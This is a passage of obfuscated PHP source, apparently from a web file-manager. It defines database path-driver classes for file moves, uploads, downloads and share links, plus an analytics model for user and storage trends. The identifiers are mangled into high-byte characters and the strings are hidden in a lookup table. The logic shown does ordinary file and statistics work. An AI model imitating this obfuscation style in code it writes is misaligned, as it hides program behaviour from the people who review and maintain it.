REPEAT_REPLACE, $ËÁŞà½ = false) { $É—¹ıŠê = $this->parse($•Åôƒ); $Ø¸üÖÒ« = $this->model->move($á•Ìïè, $É—¹ıŠê[$_SERVER[²Ö÷öõ][475]], $ùã‘Æ“ò, $ËÁŞà½); return $Ø¸üÖÒ« ? $this->getPathOuter($Ø¸üÖÒ«) : !1; } public function remove($®Öñß´ñ, $îşõÚ³Ñ = true) { return $this->model->remove($®Öñß´ñ, $îşõÚ³Ñ); } public function rename($ÄºŠ¬é—, $ø„ääŠ) { $±Ìó¼ = $this->model->rename($ÄºŠ¬é—, $ø„ääŠ); return $±Ìó¼ ? $this->getPathOuter($ÄºŠ¬é—) : $±Ìó¼; } public function size($¼®£¿£“) { $£ôÏüê† = $this->infoSimple($¼®£¿£“); return $£ôÏüê† ? $£ôÏüê†[$_SERVER[²Ö÷öõ][79]] : 0; } public function infoSimple($õÎúİøƒ) { return $this->model->sourceInfo($õÎúİøƒ); } public function info($“´‡†¯Ç) { return $this->infoParse($“´‡†¯Ç); } public function infoAuth($é­ı©êé) { return $this->infoParse($é­ı©êé, !1, !0); } public function infoWithChildren($ÕÄëŒÒ) { return $this->infoParse($ÕÄëŒÒ, !0); } protected function infoParse($ŠïÉ’‡, $¦¶„®œİ = false, $ÎÀ‹ğ†ñ = false) { if (!$¦¶„®œİ) { return $this->model->pathInfo($ŠïÉ’‡, $ÎÀ‹ğ†ñ); } return $this->model->pathInfoMore($ŠïÉ’‡); } public function infoFullSimple($¹”¡ñÚ) { $Ô„¯ë¾Å =& $_SERVER[²Ö÷öõ]; $Åã¥şŸ‹ = explode($Ô„¯ë¾Å[8], $¹”¡ñÚ); $† Ü˜ˆŞ = implode($Ô„¯ë¾Å[8], array_splice($Åã¥şŸ‹, 1)); return $this->model->pathInfoByPath($Åã¥şŸ‹[0], $† Ü˜ˆŞ); } public function infoFull($æŸü†õç) { $†­Ê¶å = $this->infoFullSimple($æŸü†õç); return is_array($†­Ê¶å) ? $this->model->pathInfo($†­Ê¶å[$_SERVER[²Ö÷öõ][193]]) : !1; } public function hashSimple($°Ü¢ÛÏ) { $¹¤›Ù¥ =& $_SERVER[²Ö÷öõ]; $‹©÷ğ = $this->infoWithChildren($°Ü¢ÛÏ); return $‹©÷ğ[$¹¤›Ù¥[170]][$¹¤›Ù¥[672]]; } public function hashMd5($¾ê¿¤) { $½ÌªÇĞ› =& $_SERVER[²Ö÷öõ]; $¦şûüÒ³ = $this->infoWithChildren($¾ê¿¤); return $¦şûüÒ³[$½ÌªÇĞ›[170]][$½ÌªÇĞ›[547]]; } public function exist($ÙÄôÇş‡) { $×Î¬Ø³¬ =& $_SERVER[²Ö÷öõ]; $Úì±èÊÉ = $this->parse($ÙÄôÇş‡); if (!$Úì±èÊÉ[$×Î¬Ø³¬[87]]) { return $this->isFile($ÙÄôÇş‡) || $this->isFolder($ÙÄôÇş‡); } $û–Ä‘¸Ú = array($×Î¬Ø³¬[477] => $Úì±èÊÉ[$×Î¬Ø³¬[475]], $×Î¬Ø³¬[32] => $Úì±èÊÉ[$×Î¬Ø³¬[87]]); $‹…è¨‡‚ = $this->model->where($û–Ä‘¸Ú)->find(); return $‹…è¨‡‚ ? !0 : !1; } public function isFile($ôçÆƒ) { $¬ÔœñáÓ =& $_SERVER[²Ö÷öõ]; $Ã½¸×£ = $this->infoSimple($ôçÆƒ); return $Ã½¸×£ && $Ã½¸×£[$¬ÔœñáÓ[485]] == $¬ÔœñáÓ[228] ? !0 : !1; } public function isFolder($¸Ú”ğº¯) { $¥Òø¹áè =& $_SERVER[²Ö÷öõ]; $¹‹ÇË‘¬ = $this->infoSimple($¸Ú”ğº¯); return $¹‹ÇË‘¬ && $¹‹ÇË‘¬[$¥Òø¹áè[485]] == $¥Òø¹áè[91] ? !0 : !1; } public function listPath($³’ÄõêÂ, $èœ‹¿¾ = false) { $îÜ¯¥¬Ú =& $_SERVER[²Ö÷öõ]; if ($³’ÄõêÂ == $îÜ¯¥¬Ú[12]) { return !1; } $˜×®×¢ = array($îÜ¯¥¬Ú[477] => $³’ÄõêÂ); if ($èœ‹¿¾) { return $this->model->listSource($˜×®×¢, -1); } return $this->model->listSource($˜×®×¢); } public function has($È½Ş……¬, $úéíÈš³ = false, $††Ş¿Èš = null) { $íò–¹¦£ =& $_SERVER[²Ö÷öõ]; $¯Ô•Úå‡ = $this->infoWithChildren($È½Ş……¬); if ($úéíÈš³) { return array($íò–¹¦£[240] => $¯Ô•Úå‡[$íò–¹¦£[240]], $íò–¹¦£[239] => $¯Ô•Úå‡[$íò–¹¦£[239]]); } return $††Ş¿Èš ? $¯Ô•Úå‡[$íò–¹¦£[240]] : $¯Ô•Úå‡[$íò–¹¦£[239]]; } public function listAll($Ïë•öãÍ) { $Š¼Ê”È = IO::info($this->pathParse[$_SERVER[²Ö÷öõ][87]]); if (!$Š¼Ê”È) { return array(); } return $this->model->listAll($Ïë•öãÍ); } public function getContent($êÚğÓŒŸ) { return $this->model->getContent($êÚğÓŒŸ); } public function setContent($‚¹˜Ê–ò, $®‚¶ë€û = '') { return $this->model->setContent($‚¹˜Ê–ò, $®‚¶ë€û); } public function fileSubstr($³·½Àğ•, $ëûİƒ¼­, $ó†µŸ¼) { return $this->model->fileSubstr($³·½Àğ•, $ëûİƒ¼­, $ó†µŸ¼); } public function download($…·Î¡™¨, $÷•—Ñ— = '') { $€ËûÁ“Ñ = get_path_father($÷•—Ñ—); $§Ó¾Ñõ = get_path_this($÷•—Ñ—); $İ›­ğÍé = $this->model->fileInfoGet($…·Î¡™¨); $ï½ÊÆÙ = IO::copy($İ›­ğÍé[$_SERVER[²Ö÷öõ][87]], $€ËûÁ“Ñ, !1, $§Ó¾Ñõ); return $ï½ÊÆÙ; } public function setModifyTime($ë´ø®­¤, $Ó˜Œ¾ÑŸ = '') { $·ªò¦ü¾ =& $_SERVER[²Ö÷öõ]; if (!$ë´ø®­¤) { return; } $this->model->where(array($·ªò¦ü¾[491] => $ë´ø®­¤))->save(array($·ªò¦ü¾[88] => $Ó˜Œ¾ÑŸ)); } public function upload($Ş©˜”ë‹, $¹‘ÏüÓ, $â›ã¸¥Ú = false, $§€»Š™ = REPEAT_REPLACE) { $÷°—‘öŒ =& $_SERVER[²Ö÷öõ]; $¯ÏøŸ£ = $this->parse($Ş©˜”ë‹); $æø³œ‡ = $this->model->addFile($¯ÏøŸ£[$÷°—‘öŒ[475]], $¹‘ÏüÓ, $¯ÏøŸ£[$÷°—‘öŒ[87]], $â›ã¸¥Ú, $§€»Š™); return $this->getPathOuter($æø³œ‡); } public function uploadFileByID($ú¼şÀÈ·, $¿·éğˆ¦, $¦–”ÄŞ) { $Ş‰èé’ş =& $_SERVER[²Ö÷öõ]; $±¥·ì¡” = $this->parse($ú¼şÀÈ·); $ÍÔ„÷¥ç = $this->model->addFileByFileID($±¥·ì¡”[$Ş‰èé’ş[475]], $¿·éğˆ¦, $±¥·ì¡”[$Ş‰èé’ş[87]], $¦–”ÄŞ); return $this->getPathOuter($ÍÔ„÷¥ç); } public function addFileByRemote($æ—çæŸî, $«¨éØı, $ÁÄ¢‘±Å = array(), $Ë“´šÁç = '', $Í© ¯À) { $äãäÊÙ =& $_SERVER[²Ö÷öõ]; $Îı˜”ÌÑ = $this->parse($æ—çæŸî); $Ë“´šÁç = empty($Ë“´šÁç) ? $Îı˜”ÌÑ[$äãäÊÙ[87]] : $Ë“´šÁç; $Å³Êï¯ = $this->model->addFileByRemote($Îı˜”ÌÑ[$äãäÊÙ[475]], $«¨éØı, $Ë“´šÁç, $ÁÄ¢‘±Å, $Í© ¯À); return $this->getPathOuter($Å³Êï¯); } public function uploadLink($—Ë¢œä’, $È¾ä³Š‰ = 0) { $ş’¯ı¶“ =& $_SERVER[²Ö÷öõ]; $È——¡› = $this->parse($—Ë¢œä’); $Ø‚íĞˆš = _get($GLOBALS[$ş’¯ı¶“[7]], $ş’¯ı¶“[1430]); $Õ“àŸ˜ = _get($GLOBALS[$ş’¯ı¶“[7]], $ş’¯ı¶“[1431]); $—Ë¢œä’ = Model($ş’¯ı¶“[674])->createFileName($È——¡›[$ş’¯ı¶“[87]], $Ø‚íĞˆš, $Õ“àŸ˜); return IO::uploadLink($—Ë¢œä’, $È¾ä³Š‰); } public function fileNameAuto($É¯‡øÃ”, $ˆ«¾é…½, $©¯°š®¡ = REPEAT_REPLACE, $óğÕ…˜Ğ = false) { return $this->model->fileNameAuto($É¯‡øÃ”, $ˆ«¾é…½, $©¯°š®¡, $óğÕ…˜Ğ); } public function fileNameExist($¶±î’ı˜, $Ù§õÔ§Ÿ) { return $this->model->fileNameExist($¶±î’ı˜, $Ù§õÔ§Ÿ); } protected function _fileOut($ó÷••Â, $»¢È«§ = false, $»Ö“Ê¯— = false, $²ï‚òì· = '', $®«‰×şæ = false) { $úèÛµ× =& $_SERVER[²Ö÷öõ]; $‘¬”ê™ª = $this->model->sourceInfo($ó÷••Â); if ($‘¬”ê™ª[$úèÛµ×[485]] == $úèÛµ×[91]) { header($úèÛµ×[1432]); die; } $œõ“Ğ²İ = $this->model->fileInfoGet($ó÷••Â); $²ï‚òì· = $œõ“Ğ²İ[$úèÛµ×[547]] ? $œõ“Ğ²İ[$úèÛµ×[547]] : $²ï‚òì·; $èÃı» = isset($GLOBALS[$úèÛµ×[182]]) && is_array($GLOBALS[$úèÛµ×[182]]) ? $GLOBALS[$úèÛµ×[182]][$úèÛµ×[32]] : $‘¬”ê™ª[$úèÛµ×[32]]; if ($®«‰×şæ) { return IO::fileOutServer($œõ“Ğ²İ[$úèÛµ×[87]], $»¢È«§, $èÃı», $²ï‚òì·); } IO::fileOut($œõ“Ğ²İ[$úèÛµ×[87]], $»¢È«§, $èÃı», $²ï‚òì·); } public function fileOut($—ºäîÌŞ, $àÑ±Œİà = false, $¶ÄŸƒÈŒ = false, $³Ê“ÖÎ¡ = '') { $this->_fileOut($—ºäîÌŞ, $àÑ±Œİà, $¶ÄŸƒÈŒ, $³Ê“ÖÎ¡); } public function fileOutServer($Û½è¤û, $é°í¹Á§ = false, $…ïæòô¥ = false, $óú¶°¾˜ = '') { $this->_fileOut($Û½è¤û, $é°í¹Á§, $…ïæòô¥, $óú¶°¾˜, !0); } protected function _fileOutImage($€ãÈÑš›, $¡ìã´¡œ = 250) { $Ø˜ÆŠÎ =& $_SERVER[²Ö÷öõ]; $°êáçÄƒ = $this->model->pathInfo($€ãÈÑš›); if ($°êáçÄƒ[$Ø˜ÆŠÎ[485]] == $Ø˜ÆŠÎ[91]) { show_json($Ø˜ÆŠÎ[1433] . $€ãÈÑš›, !1); } $áÀµë¦Ã = $this->model->fileInfoGet($€ãÈÑš›); $°êáçÄƒ[$Ø˜ÆŠÎ[183]] = $áÀµë¦Ã[$Ø˜ÆŠÎ[87]]; $GLOBALS[$Ø˜ÆŠÎ[182]] = $°êáçÄƒ; IO::fileOutImage($áÀµë¦Ã[$Ø˜ÆŠÎ[87]], $¡ìã´¡œ); } public function fileOutImage($öÑ®ş, $Ï˜˜î¦® = 250) { $this->_fileOutImage($öÑ®ş, $Ï˜˜î¦®); } public function fileOutImageServer($šìÕ‘ëÀ, $Ô—ÓŸ« = 250) { $this->_fileOutImage($šìÕ‘ëÀ, $Ô—ÓŸ«); } public function link($²ÙæœÈó, $Ñ«…ˆ¿± = '') { $¢ã’òÑ… = $this->model->fileInfoGet($²ÙæœÈó); return IO::link($¢ã’òÑ…[$_SERVER[²Ö÷öõ][87]], $Ñ«…ˆ¿±); } protected function parse($œ¾èñõà) { $Ê–ƒˆ =& $_SERVER[²Ö÷öõ]; if (strstr($œ¾èñõà, $Ê–ƒˆ[8]) === !1) { return array($Ê–ƒˆ[493] => intval($œ¾èñõà), $Ê–ƒˆ[87] => $Ê–ƒˆ[12], $Ê–ƒˆ[1429] => array()); } $ñÜ„©ªØ = explode($Ê–ƒˆ[8], trim($œ¾èñõà, $Ê–ƒˆ[8])); if (count($ñÜ„©ªØ) < 2) { show_tips(clear_html($œ¾èñõà) . $Ê–ƒˆ[1434]); } return array($Ê–ƒˆ[493] => intval($ñÜ„©ªØ[0]), $Ê–ƒˆ[87] => $ñÜ„©ªØ[1], $Ê–ƒˆ[1429] => array_slice($ñÜ„©ªØ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($‹ºÓĞ¨ı) { $this->pathParse = $‹ºÓĞ¨ı; $this->model = Model($_SERVER[²Ö÷öõ][1428]); } public function getPathOuter($ë×¯Çèõ) { $Àíïª™ƒ =& $_SERVER[²Ö÷öõ]; if (!$ë×¯Çèõ) { return $ë×¯Çèõ; } $ø¨Í²ñÇ = $this->parse($ë×¯Çèõ); return trim(KodIO::makeShare($this->pathParse[$Àíïª™ƒ[475]], $ø¨Í²ñÇ[$Àíïª™ƒ[475]]), $Àíïª™ƒ[8]); } protected function infoParse($ûÆ–ìÙÄ, $úë§ùõ = false, $Ú®÷Ç°§ = false) { $´¡åÀÓ± =& $_SERVER[²Ö÷öõ]; $§ìÁªï´ = $this->pathParse[$´¡åÀÓ±[475]]; $õØÏìÔ­ = trim($this->pathParse[$´¡åÀÓ±[1258]], $´¡åÀÓ±[8]); return Action($´¡åÀÓ±[1435])->sharePathInfo($§ìÁªï´, $õØÏìÔ­, $úë§ùõ); } public function infoFull($şÜÇµ–¸) { $ñ¦¤¹æ¦ =& $_SERVER[²Ö÷öõ]; $÷îæ‰ßİ = explode($ñ¦¤¹æ¦[8], trim($şÜÇµ–¸, $ñ¦¤¹æ¦[8])); if (count($÷îæ‰ßİ) > 1) { $Œ³ÈĞıª = implode($ñ¦¤¹æ¦[8], array_splice($÷îæ‰ßİ, 1)); $œ„´Ñ¸Ñ = $this->model->pathInfoByPath($÷îæ‰ßİ[0], $Œ³ÈĞıª); if (!$œ„´Ñ¸Ñ) { return !1; } $this->pathParse[$ñ¦¤¹æ¦[1258]] = $œ„´Ñ¸Ñ[$ñ¦¤¹æ¦[193]]; } return $this->infoParse($şÜÇµ–¸); } public function listAll($Á¨™ö) { $åÛÅ¤òá =& $_SERVER[²Ö÷öõ]; $ñ±±š•Ò = IO::info($this->pathParse[$åÛÅ¤òá[87]]); if (!$ñ±±š•Ò) { return array(); } $‚ÕÆêß = $this->model->listAll($Á¨™ö); $­ğ©¼” = Model($åÛÅ¤òá[664])->getInfo($ñ±±š•Ò[$åÛÅ¤òá[665]]); foreach ($‚ÕÆêß as &$«İö†î¤) { check_abort(); $«İö†î¤[$åÛÅ¤òá[90]] = Action($åÛÅ¤òá[1435])->_shareItemeParse($«İö†î¤[$åÛÅ¤òá[90]], $­ğ©¼”); } unset($«İö†î¤); return $‚ÕÆêß; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Šè¦ØÙÑ) { $this->pathParse = $Šè¦ØÙÑ; $this->model = Model($_SERVER[²Ö÷öõ][1428]); } protected function infoParse($„·Õ…—, $æ¯‹ü„ = false, $§”åÓÂ = false) { $Â„§ëë¬ =& $_SERVER[²Ö÷öõ]; return Action($Â„§ëë¬[1264])->sharePathInfo($this->pathParse[$Â„§ëë¬[87]], !0, $æ¯‹ü„); } public function listPath($æèş”·Ò, $«Ñ½÷¼ì = false) { $ì•Ö«ºœ =& $_SERVER[²Ö÷öõ]; $ğø›©ûÍ = parent::listPath($æèş”·Ò, $«Ñ½÷¼ì); if (!$ğø›©ûÍ) { return $ğø›©ûÍ; } if (is_array($ğø›©ûÍ[$ì•Ö«ºœ[1436]])) { $ğø›©ûÍ[$ì•Ö«ºœ[1436]] = Action($ì•Ö«ºœ[1264])->shareItemInfo($ğø›©ûÍ[$ì•Ö«ºœ[1436]]); } foreach ($ğø›©ûÍ as $¦¾•äöˆ => $éâÔéŒ±) { if (!in_array($¦¾•äöˆ, array($ì•Ö«ºœ[86], $ì•Ö«ºœ[85]))) { continue; } foreach ($éâÔéŒ± as $ÁÂõ¢Ã => $¤€‹¸ô) { $ğø›©ûÍ[$¦¾•äöˆ][$ÁÂõ¢Ã] = Action($ì•Ö«ºœ[1264])->shareItemInfo($¤€‹¸ô); } } return $ğø›©ûÍ; } public function listAll($µØÏš) { $“ª÷‘³ =& $_SERVER[²Ö÷öõ]; $ñÕ­’´š = IO::info($this->pathParse[$“ª÷‘³[87]]); if (!$ñÕ­’´š) { return array(); } $ÚØŞ¹¢¹ = $this->model->listAll($µØÏš); foreach ($ÚØŞ¹¢¹ as &$íö¹ğ) { $íö¹ğ[$“ª÷‘³[90]] = Action($“ª÷‘³[1264])->shareItemInfo($íö¹ğ[$“ª÷‘³[90]]); } unset($íö¹ğ); return $ÚØŞ¹¢¹; } } goto b¥ƒê˜Š; Aõ£õ¬Á«: class AnalysisModel extends ModelBaseLight { public function init($æ’Ô”®ø) { $ÆØ™¢– =& $_SERVER[²Ö÷öõ]; $ĞİˆÕõ¥ = array($ÆØ™¢–[662] => array($ÆØ™¢–[33] => $ÆØ™¢–[1908], $ÆØ™¢–[350] => array($ÆØ™¢–[255], $ÆØ™¢–[848], $ÆØ™¢–[1909], $ÆØ™¢–[1910])), $ÆØ™¢–[1911] => array($ÆØ™¢–[33] => $ÆØ™¢–[1912], $ÆØ™¢–[350] => array($ÆØ™¢–[255], $ÆØ™¢–[846], $ÆØ™¢–[1913], $ÆØ™¢–[1914], $ÆØ™¢–[1915]))); if (!isset($ĞİˆÕõ¥[$æ’Ô”®ø])) { return !1; } $this->optionType = $ĞİˆÕõ¥[$æ’Ô”®ø][$ÆØ™¢–[33]]; $this->field = $ĞİˆÕõ¥[$æ’Ô”®ø][$ÆØ™¢–[350]]; return !0; } public function listData($°ê‘Ù®– = false, $í˜†¢òä = "\x6d\x6f\144\x69\146\x79\x54\x69\x6d\145", $ıûÏÇË· = false) { return parent::listData($°ê‘Ù®–, $í˜†¢òä, $ıûÏÇË·); } public function trendList($¯Ë‹ºÍ²) { $‘ûüîáÅ =& $_SERVER[²Ö÷öõ]; $è˜ğÃ±Ø = $this->listData(); if ($è˜ğÃ±Ø) { $¾ÎáïÔ = end($è˜ğÃ±Ø); $ŒŸŞ½š = date($‘ûüîáÅ[1916], strtotime($‘ûüîáÅ[1917])); if ($¾ÎáïÔ[$‘ûüîáÅ[255]] == $ŒŸŞ½š) { return $è˜ğÃ±Ø; } $…ÕâÙ£— = strtotime($¾ÎáïÔ[$‘ûüîáÅ[255]]); } if (!isset($…ÕâÙ£—)) { $¦’ÏŒÚÔ = $¯Ë‹ºÍ² == $‘ûüîáÅ[662] ? $‘ûüîáÅ[598] : $‘ûüîáÅ[907]; $…ÕâÙ£— = Model($¦’ÏŒÚÔ)->min($‘ûüîáÅ[231]); } $ÏÖçøí = $‘ûüîáÅ[1918] . ucfirst($¯Ë‹ºÍ²); $•èÇ‘é = $this->dateList($…ÕâÙ£—); foreach ($•èÇ‘é as $ŒŸŞ½š) { $this->{$ÏÖçøí}($ŒŸŞ½š); } return $this->listData(); } private function dateList($æ²ÆÊÏœ) { $Ó´”Ù =& $_SERVER[²Ö÷öõ]; $¾´öÓÈÂ = $æ²ÆÊÏœ; $ï­“§¼½ = strtotime($Ó´”Ù[1917]); $ÆÌÃ¿“õ = array(); while ($¾´öÓÈÂ <= $ï­“§¼½) { $ÆÌÃ¿“õ[] = date($Ó´”Ù[1916], $¾´öÓÈÂ); $¾´öÓÈÂ = strtotime($Ó´”Ù[1919], $¾´öÓÈÂ); } return $ÆÌÃ¿“õ; } public function _recordUser($û°”¹ĞŠ = '') { $Œ·õóÊ² =& $_SERVER[²Ö÷öõ]; $ÆººÃú´ = strtotime(date($Œ·õóÊ²[1920], strtotime($û°”¹ĞŠ))); $Ó‡›òÑã = strtotime(date($Œ·õóÊ²[1921], strtotime($û°”¹ĞŠ))); $ÓÇş¾Ì¡ = array($Œ·õóÊ²[231] => array($Œ·õóÊ²[1099], $Ó‡›òÑã)); $µÉìĞ› = Model($Œ·õóÊ²[598])->where($ÓÇş¾Ì¡)->count($Œ·õóÊ²[1780]); $ÓÇş¾Ì¡[$Œ·õóÊ²[231]] = array($Œ·õóÊ²[409], array($ÆººÃú´, $Ó‡›òÑã)); $â´ÔÌÀñ = Model($Œ·õóÊ²[598])->where($ÓÇş¾Ì¡)->count($Œ·õóÊ²[1780]); $ÓÇş¾Ì¡[$Œ·õóÊ²[33]] = $Œ·õóÊ²[1922]; $…ú¿ôÁ± = Model($Œ·õóÊ²[1923])->where($ÓÇş¾Ì¡)->count($Œ·õóÊ²[1924]); $ó‰–¾Ô¨ = array($Œ·õóÊ²[255] => $û°”¹ĞŠ, $Œ·õóÊ²[848] => (int) $µÉìĞ›, $Œ·õóÊ²[1909] => (int) $â´ÔÌÀñ, $Œ·õóÊ²[1910] => (int) $…ú¿ôÁ±); return $this->insert($ó‰–¾Ô¨); } public function _recordStore($Ş‰ÈÆæÖ = '') { $ŞôĞèßÅ =& $_SERVER[²Ö÷öõ]; $–ù„Èğ³ = strtotime(date($ŞôĞèßÅ[1921], strtotime($Ş‰ÈÆæÖ))); $›Ğ¸¼Şš = array($ŞôĞèßÅ[231] => array($ŞôĞèßÅ[1099], $–ù„Èğ³)); $çá‡Ü¯§ = Model($ŞôĞèßÅ[544])->where($›Ğ¸¼Şš)->sum($ŞôĞèßÅ[79]); $›Ğ¸¼Şš[$ŞôĞèßÅ[485]] = 0; $¡€€ø—  = Model($ŞôĞèßÅ[907])->where($›Ğ¸¼Şš)->sum($ŞôĞèßÅ[79]); $›Ğ¸¼Şš[$ŞôĞèßÅ[190]] = 1; $Â  ­ñä = Model($ŞôĞèßÅ[907])->where($›Ğ¸¼Şš)->sum($ŞôĞèßÅ[79]); $›Ğ¸¼Şš[$ŞôĞèßÅ[190]] = 2; $éİ–€† = Model($ŞôĞèßÅ[907])->where($›Ğ¸¼Şš)->sum($ŞôĞèßÅ[79]); $¤Î½õÏÌ = array($ŞôĞèßÅ[255] => $Ş‰ÈÆæÖ, $ŞôĞèßÅ[846] => (int) $¡€€ø— , $ŞôĞèßÅ[1913] => (int) $çá‡Ü¯§, $ŞôĞèßÅ[1914] => (int) $Â  ­ñä, $ŞôĞèßÅ[1915] => (int) $éİ–€†); return $this->insert($¤Î½õÏÌ); } public function trend($Ï½§º¤ò, $«ã³ÜÜ) { $Ááş¿¿Ù =& $_SERVER[²Ö÷öõ]; if (!$this->init($Ï½§º¤ò)) { return !1; } $öñææïÂ = $this->trendList($Ï½§º¤ò); if ($öñææïÂ && $«ã³ÜÜ != $Ááş¿¿Ù[1753]) { $áÎ¸ğØü = $öñææïÂ[0][$Ááş¿¿Ù[255]]; $Ÿ–µ»êª = $this->validDate($«ã³ÜÜ, $áÎ¸ğØü); $†ïÓñ¬¿ = array(); $£¦…ıŸ = array_to_keyvalue($öñææïÂ, $Ááş¿¿Ù[255]); foreach ($Ÿ–µ»êª as $õ”ğó) { if (isset($£¦…ıŸ[$õ”ğó])) { $¥Ú¬æ¡Ç = $£¦…ıŸ[$õ”ğó]; } else { $¥Ú¬æ¡Ç = end($öñææïÂ); $¥Ú¬æ¡Ç[$Ááş¿¿Ù[255]] = $õ”ğó; if ($Ï½§º¤ò == $Ááş¿¿Ù[662]) { $¥Ú¬æ¡Ç[$Ááş¿¿Ù[1909]] = $¥Ú¬æ¡Ç[$Ááş¿¿Ù[1910]] = 0; } } $†ïÓñ¬¿[] = $¥Ú¬æ¡Ç; } $öñææïÂ = $†ïÓñ¬¿; } $Ş¦ŒÄ… = array($Ááş¿¿Ù[662] => array($Ááş¿¿Ù[848] => LNG($Ááş¿¿Ù[1925]), $Ááş¿¿Ù[1909] => LNG($Ááş¿¿Ù[1926]), $Ááş¿¿Ù[1910] => LNG($Ááş¿¿Ù[1927])), $Ááş¿¿Ù[1911] => array($Ááş¿¿Ù[846] => LNG($Ááş¿¿Ù[1928]), $Ááş¿¿Ù[1913] => LNG($Ááş¿¿Ù[1929]), $Ááş¿¿Ù[1914] => LNG($Ááş¿¿Ù[1930]), $Ááş¿¿Ù[1915] => LNG($Ááş¿¿Ù[1931]))); $²‰ú³¹ = array($Ááş¿¿Ù[662] => $Ááş¿¿Ù[1932], $Ááş¿¿Ù[1911] => $Ááş¿¿Ù[79]); if (empty($öñææïÂ)) { $õ”ğó = date($Ááş¿¿Ù[1916], strtotime($Ááş¿¿Ù[1917])); $¯ĞùÄî = array($Ááş¿¿Ù[255] => $õ”ğó); foreach ($Ş¦ŒÄ…[$Ï½§º¤ò] as $ºñ®Õ ¡ => $Ï¸ƒ¤°ó) { $¯ĞùÄî[$ºñ®Õ ¡] = 0; } $öñææïÂ[] = $¯ĞùÄî; } $Ğ”²ºóî = array(); foreach ($öñææïÂ as $Ï¸ƒ¤°ó) { if ($Ï½§º¤ò == $Ááş¿¿Ù[1911] && $Ï¸ƒ¤°ó[$Ááş¿¿Ù[1913]] > $Ï¸ƒ¤°ó[$Ááş¿¿Ù[846]]) { $Ï¸ƒ¤°ó[$Ááş¿¿Ù[1913]] = $Ï¸ƒ¤°ó[$Ááş¿¿Ù[846]]; } foreach ($Ş¦ŒÄ…[$Ï½§º¤ò] as $ºñ®Õ ¡ => $½¯İãúˆ) { $¥Ú¬æ¡Ç = array($Ááş¿¿Ù[255] => $Ï¸ƒ¤°ó[$Ááş¿¿Ù[255]], $Ááş¿¿Ù[1667] => $½¯İãúˆ); $¥Ú¬æ¡Ç[$²‰ú³¹[$Ï½§º¤ò]] = isset($Ï¸ƒ¤°ó[$ºñ®Õ ¡]) ? $Ï¸ƒ¤°ó[$ºñ®Õ ¡] : 0; $Ğ”²ºóî[] = $¥Ú¬æ¡Ç; } } return $Ğ”²ºóî; } public function validDate($ó»¬Ìã·, $Úé¯ŸÚ®) { $úıÇèê =& $_SERVER[²Ö÷öõ]; $ı‚½—Æ = date($úıÇèê[1916], strtotime($úıÇèê[1917])); $½ì“×Õò = array($ı‚½—Æ); switch ($ó»¬Ìã·) { case $úıÇèê[1760]: $«ş¥Â Â = mktime(0, 0, 0, date($úıÇèê[1933]), date($úıÇèê[1459]) - date($úıÇèê[1549]) + 7 - 7, date($úıÇèê[1934])); $äÍŸÇù± = 0; do { $¾Ô£¨Û = date($úıÇèê[1916], $«ş¥Â Â - 3600 * 24 * 7 * $äÍŸÇù±); $½ì“×Õò[] = $¾Ô£¨Û; $äÍŸÇù±++; } while ($Úé¯ŸÚ® < $¾Ô£¨Û); break; case $úıÇèê[1758]: $äÍŸÇù± = 1; do { $£È­¡ã¢ = date($úıÇèê[1935], strtotime("\55\40{$äÍŸÇù±}\x20\x6d\x6f\x6e\164\x68\163")); $½ì“×Õò[] = $£È­¡ã¢; $äÍŸÇù±++; } while ($Úé¯ŸÚ® < $£È­¡ã¢); break; case $úıÇèê[1936]: $‡ÅÖ­î = (int) date($úıÇèê[1934], strtotime($Úé¯ŸÚ®)); $°ƒÔ¢Íæ = (int) date($úıÇèê[1934]); if ($‡ÅÖ­î >= $°ƒÔ¢Íæ) { break; } for ($‡ÅÖ­î; $‡ÅÖ­î < $°ƒÔ¢Íæ; $‡ÅÖ­î++) { $½ì“×Õò[] = $‡ÅÖ­î . $úıÇèê[1937]; } break; default: break; } if ($Úé¯ŸÚ® > end($½ì“×Õò)) { array_pop($½ì“×Õò); } sort($½ì“×Õò); return $½ì“×Õò; } public function listTable($şò¯Úñó) { $ˆß¤“÷ú = ucfirst($şò¯Úñó); return Model($ˆß¤“÷ú)->listData(); } public function option($ó®óµ®ı) { $Ú¨œĞï = $_SERVER[²Ö÷öõ][1938] . ucfirst($ó®óµ®ı); return $this->{$Ú¨œĞï}(); } private function optionUser() { $÷Ğ­£ =& $_SERVER[²Ö÷öõ]; $î–œ‹è³ = Model($÷Ğ­£[598])->count($÷Ğ­£[1780]); $µô‹êŒ = Model($÷Ğ­£[598])->where($÷Ğ­£[1939])->count($÷Ğ­£[1780]); $­®„Ş‚¨ = intval($GLOBALS[$÷Ğ­£[6]][$÷Ğ­£[425]][$÷Ğ­£[1726]]) / 3600; $Â†¤ßÆ· = strtotime("\x2d{$­®„Ş‚¨}\x20\150\157\x75\162\163"); $„ÀâÂÓğ = strtotime(date($÷Ğ­£[1920])); if ($Â†¤ßÆ· < $„ÀâÂÓğ) { $Â†¤ßÆ· = $„ÀâÂÓğ; } $Øüê”’€ = array($÷Ğ­£[1940] => array($÷Ğ­£[1100], $Â†¤ßÆ·)); $­Ùì£¹Å = (int) Model($÷Ğ­£[598])->where($Øüê”’€)->count($÷Ğ­£[1780]); if (!$­Ùì£¹Å) { $­Ùì£¹Å = 1; } $Øüê”’€ = array($÷Ğ­£[1940] => array($÷Ğ­£[1100], $„ÀâÂÓğ)); $Çıíãİß = Model($÷Ğ­£[598])->where($Øüê”’€)->count($÷Ğ­£[1780]); return array($÷Ğ­£[841] => (int) $î–œ‹è³, $÷Ğ­£[1941] => (int) ($î–œ‹è³ - $µô‹êŒ), $÷Ğ­£[1942] => (int) $µô‹êŒ, $÷Ğ­£[1943] => (int) $Çıíãİß, $÷Ğ­£[1944] => $­Ùì£¹Å); } private function optionFile() { $†ë¿–±¹ =& $_SERVER[²Ö÷öõ]; $Ï€ôÛ¼× = $this->sourceSize(); $½é¬ØÈæ = $Ï€ôÛ¼×[$†ë¿–±¹[79]]; $‡Œšù¨ = $Ï€ôÛ¼×[$†ë¿–±¹[1913]]; $ª¶ğÖÉ¯ = Model($†ë¿–±¹[907])->where(array($†ë¿–±¹[485] => 0))->count($†ë¿–±¹[193]); $í—™áŠ’ = array($†ë¿–±¹[485] => 0, $†ë¿–±¹[231] => array($†ë¿–±¹[1100], strtotime(date($†ë¿–±¹[1920])))); $Ê²«ŠÕÅ = Model($†ë¿–±¹[907])->where($í—™áŠ’)->sum($†ë¿–±¹[79]); $¿ôíõ¼¬ = 